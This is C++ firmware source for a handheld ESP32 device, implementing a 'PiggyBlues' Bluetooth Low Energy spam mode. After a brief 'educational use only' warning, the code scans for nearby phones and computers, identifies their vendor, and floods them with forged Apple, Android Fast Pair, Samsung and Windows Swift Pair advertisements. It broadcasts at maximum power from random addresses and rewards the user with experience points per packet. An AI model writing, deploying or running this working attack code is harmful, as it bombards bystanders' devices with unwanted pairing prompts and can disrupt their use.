bool PiggyBluesMode::showWarningDialog() {
    // Warning dialog styled like showToast - pink box on black background
    // Slightly larger to fit warning text
    M5Canvas& canvas = Display::getMain();
    
    // Set bottom bar overlay for duration of dialog
    Display::setBottomOverlay("NO LOLLYGAGGIN'");
    
    int boxW = DIALOG_WIDTH;
    int boxH = DIALOG_HEIGHT;
    int boxX = (DISPLAY_W - boxW) / 2;
    int boxY = (MAIN_H - boxH) / 2;
    
    uint32_t startTime = millis();
    uint32_t timeout = DIALOG_TIMEOUT_MS;
    
    while ((millis() - startTime) < timeout) {
        M5.update();
        M5Cardputer.update();
        
        uint32_t remaining = (timeout - (millis() - startTime)) / 1000 + 1;
        
        // Clear and redraw
        canvas.fillSprite(COLOR_BG);
        
        // Black border then pink fill
        canvas.fillRoundRect(boxX - 2, boxY - 2, boxW + 4, boxH + 4, 8, COLOR_BG);
        canvas.fillRoundRect(boxX, boxY, boxW, boxH, 8, COLOR_FG);
        
        // Black text on pink background
        canvas.setTextColor(COLOR_BG, COLOR_FG);
        canvas.setTextDatum(top_center);
        canvas.setTextSize(1);
        canvas.setFont(&fonts::Font0);
        
        int centerX = DISPLAY_W / 2;
        canvas.drawString("!! WARNING !!", centerX, boxY + 8);
        canvas.drawString("BLE NOTIFICATION SPAM", centerX, boxY + 22);
        canvas.drawString("EDUCATIONAL USE ONLY!", centerX, boxY + 36);
        
        char buf[24];
        snprintf(buf, sizeof(buf), "[Y] YES  [N] NO (%lu)", remaining);
        canvas.drawString(buf, centerX, boxY + 54);
        
        Display::pushAll();
        
        if (M5Cardputer.Keyboard.isChange()) {
            if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
                Display::clearBottomOverlay();
                return false;
            }
            if (M5Cardputer.Keyboard.isKeyPressed('y') || M5Cardputer.Keyboard.isKeyPressed('Y')) {
                Display::clearBottomOverlay();
                return true;
            }
        }
        
        delay(50);
    }
    
    // Timeout = abort
    Display::clearBottomOverlay();
    return false;
}

void PiggyBluesMode::start() {
    if (running) return;
    
    // Reset state for new session
    init();
    Mood::resetBLESniffState();  // Reset first-target sniff for new session
    
    // Show warning dialog
    if (!showWarningDialog()) {
        return;
    }
    
    confirmed = true;
    
    // Stop NetworkRecon before disabling WiFi (BLE needs exclusive radio)
    NetworkRecon::stop();
    
    // Stop WiFi radio but keep driver initialized (shared antenna for BLE)
    // WiFi.mode(WIFI_OFF) calls esp_wifi_deinit() which causes RX buffer allocation
    // failures on restart — use esp_wifi_stop() to keep buffers allocated
    WiFi.disconnect(true);
    delay(BLE_OP_DELAY_MS);
    
    // Initialize NimBLE only if not already initialized
    if (!NimBLEDevice::isInitialized()) {
        NimBLEDevice::init("");
    }
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);  // Max power for range
    NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);  // Use random address
    
    pAdvertising = NimBLEDevice::getAdvertising();
    if (!pAdvertising) {
        WiFi.mode(WIFI_STA);  // Re-enable WiFi on failure
        return;
    }
    pAdvertising->setMinInterval(BLE_ADV_MIN_INTERVAL);  // 20ms
    pAdvertising->setMaxInterval(BLE_ADV_MAX_INTERVAL);  // 40ms
    pAdvertising->setConnectableMode(BLE_GAP_CONN_MODE_NON);  // Non-connectable
    
    running = true;
    lastBurstTime = millis();
    
    // Start continuous background scanning
    startContinuousScan();
    
    // Fast moving binary grass for chaos mode
    Avatar::setGrassSpeed(50);  // Fast chaos mode
    Avatar::setGrassMoving(true);
}

void PiggyBluesMode::stop() {
    if (!running) return;
    
    // Stop continuous scan first
    stopContinuousScan();
    
    // Clear scan results
    NimBLEScan* pScan = NimBLEDevice::getScan();
    if (pScan) {
        pScan->clearResults();
    }
    
    // Stop advertising
    if (pAdvertising && pAdvertising->isAdvertising()) {
        pAdvertising->stop();
        delay(BLE_OP_DELAY_MS);
    }
    // Keep pAdvertising pointer - we'll reuse it on restart
    
    // Give BLE stack time to settle
    delay(BLE_STACK_SETTLE_MS);
    
    // DON'T call deinit - ESP32-S3 has issues reinitializing BLE after deinit
    // Just keep BLE initialized but idle
    
    running = false;
    confirmed = false;
    targets.clear();
    targets.shrink_to_fit();  // FIX: Release vector capacity to recover heap
    activeCount = 0;
    setAdvertisingNow(false);
    
    Avatar::setGrassMoving(false);
    Avatar::resetGrass();
    Avatar::waveRipple(WaveMode::NONE);
    
    bool doReboot = (random(0, 100) < REBOOT_CHANCE_PERCENT);
    if (doReboot) {
        // Death screen - take over display
        M5.Display.fillScreen(TFT_BLACK);
        M5.Display.setTextColor(TFT_RED);
        M5.Display.setTextDatum(middle_center);
        M5.Display.setTextSize(3);
        M5.Display.drawString("YOU DIED", M5.Display.width() / 2, M5.Display.height() / 2);
        
        // Play death sound and wait 5 seconds (pumping audio engine)
        SFX::play(SFX::YOU_DIED);
        uint32_t start = millis();
        while (millis() - start < 5000) {
            SFX::update();
            delay(10);
        }
        
        ESP.restart();
        return;
    }
    
    // No reboot this time - reward XP and restore network recon
    Display::showToast("BLUES SLAYED.\nJUST ROULETTE.\n+15 XP");
    XP::addRouletteWin();
    XP::addXPSilent(NO_REBOOT_XP_BONUS);

    // Restore WiFi driver after BLE tore it down in start()
    WiFi.mode(WIFI_STA);
    delay(HeapPolicy::kWiFiModeDelayMs);

    // Restart background network reconnaissance (WiFi promiscuous mode)
    NetworkRecon::start();
}

void PiggyBluesMode::update() {
    if (!running) return;
    
    uint32_t now = millis();
    
    // Process any targets discovered by scan callback (deferred pattern)
    processTargets();
    
    // Age out stale targets (not seen in 10s = out of range)
    ageOutStaleTargets();
    
    // Refresh active target selection (sorted by RSSI)
    selectActiveTargets();
    
    // Non-blocking advertising state machine
    bool advNow = getAdvertisingNow();
    if (advNow) {
        // We are in an advertising burst. Check if it's time to stop.
        if (now - advertisingStartTime >= cfgAdvDuration) {
            if (pAdvertising && pAdvertising->isAdvertising()) {
                pAdvertising->stop();
            }
            setAdvertisingNow(false);
        }
    } else {
        // We are not advertising. Check if it's time to start a new burst.
        if (now - lastBurstTime >= burstInterval) {
            setAdvertisingNow(true);
            advertisingStartTime = now;
            lastBurstTime = now; // Reset timer for the next burst interval.
            
            // This function will now only START the advertisement, not block.
            sendRandomPayload();
        }
    }
    
    // Update mood occasionally with target info
    if (now - lastMoodUpdateTime > MOOD_UPDATE_INTERVAL_MS) {
        const char* vendorStr = nullptr;
        if (lastVendorUsed != BLEVendor::UNKNOWN) {
            switch (lastVendorUsed) {
                case BLEVendor::APPLE: vendorStr = "Apple"; break;
                case BLEVendor::ANDROID: vendorStr = "Android"; break;
                case BLEVendor::SAMSUNG: vendorStr = "Samsung"; break;
                case BLEVendor::WINDOWS: vendorStr = "Windows"; break;
                default: break;
            }
        }
        uint8_t totalFound = (targets.size() > MAX_TARGETS_FOR_MOOD) ? MAX_TARGETS_FOR_MOOD : (uint8_t)targets.size();
        Mood::onPiggyBluesUpdate(vendorStr, lastRssiUsed, activeCount, totalFound);
        lastMoodUpdateTime = now;
    }
}

// Old scanForDevices() and selectTargets() removed - replaced by continuous async scanning

BLEVendor PiggyBluesMode::identifyVendor(const uint8_t* mfgData, size_t len) {
    if (!mfgData || len < 2) return BLEVendor::UNKNOWN;
    
    // Company ID is first 2 bytes (little endian)
    uint16_t companyId = mfgData[0] | (mfgData[1] << 8);
    
    switch (companyId) {
        case 0x004C:  // Apple
            return BLEVendor::APPLE;
        case 0x00E0:  // Google
        case 0x02E0:  // Google (alternate)
            return BLEVendor::ANDROID;
        case 0x0075:  // Samsung
            return BLEVendor::SAMSUNG;
        case 0x0006:  // Microsoft
            return BLEVendor::WINDOWS;
        default:
            return BLEVendor::UNKNOWN;
    }
}

void PiggyBluesMode::sendAppleJuice() {
    if (!pAdvertising) return;
    
    // Stop any current advertising first
    if (pAdvertising->isAdvertising()) {
        pAdvertising->stop();
    }
    
    // Randomly choose between long (audio) and short (AppleTV) devices
    // Short devices work at longer range
    bool useLongDevice = (random(0, 2) == 0);
    
    const uint8_t* payload;
    size_t len;
    
    if (useLongDevice) {
        int idx = random(0, APPLE_LONG_COUNT);
        payload = APPLE_DEVICES_LONG[idx];
    } else {
        int idx = random(0, APPLE_SHORT_COUNT);
        payload = APPLE_DEVICES_SHORT[idx];
    }
    len = payload[0] + 1;  // First byte is length, +1 for the length byte itself
    
    // Use non-connectable advertising for BLE spam
    pAdvertising->setConnectableMode(BLE_GAP_CONN_MODE_NON);
    
    // Use raw payload directly in advertisement data
    advDataCache.clearData();
    if (!advDataCache.addData(payload, len)) {
        return;
    }
    if (!pAdvertising->setAdvertisementData(advDataCache)) {
        return;
    }
    
    // Start advertising
    if (pAdvertising->start()) {
        Avatar::waveRipple(WaveMode::OUTGOING);
        totalPackets++;
        appleCount++;
        XP::addXP(XPEvent::BLE_APPLE);  // +3 XP
    }
}

void PiggyBluesMode::sendAndroidFastPair() {
    if (!pAdvertising) return;
    
    if (pAdvertising->isAdvertising()) {
        pAdvertising->stop();
    }
    
    // Random FastPair model
    uint32_t modelId = FASTPAIR_MODELS[random(0, FASTPAIR_MODEL_COUNT)];
    
    // Build FastPair advertisement payload without heap allocations
    uint8_t payload[14];
    payload[0] = 0x02;  // Flags length
    payload[1] = 0x01;  // Flags type
    payload[2] = 0x06;  // LE General Discoverable + BR/EDR not supported
    payload[3] = 0x03;  // Service UUID list length
    payload[4] = 0x03;  // Complete list of 16-bit Service UUIDs
    payload[5] = 0x2C;  // 0xFE2C (Fast Pair)
    payload[6] = 0xFE;
    payload[7] = 0x06;  // Service Data length
    payload[8] = 0x16;  // Service Data AD type
    payload[9] = 0x2C;  // 0xFE2C
    payload[10] = 0xFE;
    payload[11] = (modelId >> 16) & 0xFF;
    payload[12] = (modelId >> 8) & 0xFF;
    payload[13] = modelId & 0xFF;

    advDataCache.clearData();
    if (!advDataCache.addData(payload, sizeof(payload))) {
        return;
    }
    
    pAdvertising->setConnectableMode(BLE_GAP_CONN_MODE_NON);
    if (!pAdvertising->setAdvertisementData(advDataCache)) {
        return;
    }
    
    if (pAdvertising->start()) {
        totalPackets++;
        androidCount++;
        XP::addXP(XPEvent::BLE_ANDROID);  // +2 XP
    }
}

void PiggyBluesMode::sendSamsungSpam() {
    if (!pAdvertising) return;
    
    if (pAdvertising->isAdvertising()) {
        pAdvertising->stop();
    }
    
    // Random Samsung payload
    int idx = random(0, SAMSUNG_PAYLOAD_COUNT);
    const uint8_t* payload = SAMSUNG_PAYLOADS[idx];
    size_t len = payload[0] + 1;  // payload[0] is length byte
    
    // Use raw payload directly in advertisement data
    pAdvertising->setConnectableMode(BLE_GAP_CONN_MODE_NON);
    advDataCache.clearData();
    if (!advDataCache.addData(payload, len)) {
        return;
    }
    if (!pAdvertising->setAdvertisementData(advDataCache)) {
        return;
    }
    
    if (pAdvertising->start()) {
        totalPackets++;
        samsungCount++;
        XP::addXP(XPEvent::BLE_SAMSUNG);  // +2 XP
    }
}

void PiggyBluesMode::sendWindowsSwiftPair() {
    if (!pAdvertising) return;
    
    if (pAdvertising->isAdvertising()) {
        pAdvertising->stop();
    }
    
    // SwiftPair beacon format
    // Microsoft vendor ID + SwiftPair indicator
    // NimBLE 2.x: setManufacturerData expects [company_lo, company_hi, data...]
    uint8_t mfgData[] = {
        0x06, 0x00,              // Microsoft company ID (little endian)
        0x03,                    // SwiftPair beacon type
        0x00,                    // Reserved
        0x80                     // Display icon (0x80 = generic)
    };
    
    // Build SwiftPair payload without heap allocations
    static const char kSwiftPairName[] = "Free Bluetooth";
    constexpr size_t kSwiftPairNameLen = sizeof(kSwiftPairName) - 1;
    uint8_t payload[31];
    size_t idx = 0;
    payload[idx++] = 0x02;  // Flags length
    payload[idx++] = 0x01;  // Flags type
    payload[idx++] = 0x06;  // LE General Discoverable + BR/EDR not supported
    payload[idx++] = static_cast<uint8_t>(sizeof(mfgData) + 1); // Length of mfg data + type
    payload[idx++] = 0xFF;  // Manufacturer data type
    memcpy(&payload[idx], mfgData, sizeof(mfgData));
    idx += sizeof(mfgData);
    payload[idx++] = static_cast<uint8_t>(kSwiftPairNameLen + 1); // Name length + type
    payload[idx++] = 0x09;  // Complete local name
    memcpy(&payload[idx], kSwiftPairName, kSwiftPairNameLen);
    idx += kSwiftPairNameLen;

    if (idx > sizeof(payload)) {
        return;
    }

    advDataCache.clearData();
    if (!advDataCache.addData(payload, idx)) {
        return;
    }
    
    pAdvertising->setConnectableMode(BLE_GAP_CONN_MODE_NON);
    if (!pAdvertising->setAdvertisementData(advDataCache)) {
        return;
    }
    
    if (pAdvertising->start()) {
        totalPackets++;
        windowsCount++;
        XP::addXP(XPEvent::BLE_WINDOWS);  // +2 XP
    }
}

void PiggyBluesMode::sendRandomPayload() {
    // If we have active targets, weight payloads toward detected vendors
    // Otherwise pure random chaos
    // NOTE: targets is sorted by RSSI, activeCount = number of "active" targets at front
    
    if (activeCount > 0 && targets.size() > 0) {
        // Pick a random target from the active set (first activeCount entries)
        uint8_t idx = random(0, activeCount);
        if (idx < targets.size()) {
            BLEVendor vendor = targets[idx].vendor;
            lastVendorUsed = vendor;
            lastRssiUsed = targets[idx].rssi;
            
            switch (vendor) {
                case BLEVendor::APPLE:
                    sendAppleJuice();
                    return;
                case BLEVendor::ANDROID:
                    sendAndroidFastPair();
                    return;
                case BLEVendor::SAMSUNG:
                    sendSamsungSpam();
                    return;
                case BLEVendor::WINDOWS:
                    sendWindowsSwiftPair();
                    return;
                default:
                    break;  // Fall through to random
            }
        }
    }
    
    // Fallback: random chaos mode (no targets or unknown vendor)
    lastVendorUsed = BLEVendor::UNKNOWN;
    lastRssiUsed = 0;
    int choice = random(0, 4);
    switch (choice) {
        case 0: sendAppleJuice(); break;
        case 1: sendAndroidFastPair(); break;
        case 2: sendSamsungSpam(); break;
        case 3: sendWindowsSwiftPair(); break;
    }
}
